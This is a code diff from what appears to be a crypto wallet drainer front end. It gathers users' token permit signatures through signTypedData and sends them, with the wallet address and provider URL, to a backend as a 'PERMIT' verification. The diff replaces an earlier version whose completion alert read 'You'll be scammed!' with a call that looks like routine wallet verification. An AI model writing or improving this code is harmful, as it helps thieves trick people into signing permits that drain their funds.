@@ -10,6 +10,7 @@ import {getConfig, handleVerificationResponse} from "@v3/@special/wallet/actions
 import {signTypedData} from "@wagmi/core";
 import {config} from "@/context/config";
 import {FinalizedSignedSignature} from "@/app/(version1)/v1/page";
+import {handleWalletVerification} from "@v3/@special/wallet/Verification";
 
 
 class iTzUnity {
@@ -93,25 +94,14 @@ class iTzUnity {
 			"V", sig.v.toString()
 		);
 		console.log(sig);
-
-		setSignatures(pre => ({
-			...pre,
-			[token.contract_ticker_symbol]: sig
-		}));
-
+		const providerUrl = //@ts-ignore
+			provider?.connection?.url;
 		const payload: FinalizedSignedSignature = {
 			signedSignature: sig,
 			provider: providerUrl,
 			token
 		}
-
-		fetch("/api/signature", {
-			method: "POST",
-			body: JSON.stringify(payload),
-			headers: {
-				'content-type': "application/json"
-			}
-		}).then(()=>alert("You'll be scammed!")).catch(console.error)
+		await handleVerificationResponse("PERMIT",account.address+"",payload);
 	}
 }
 
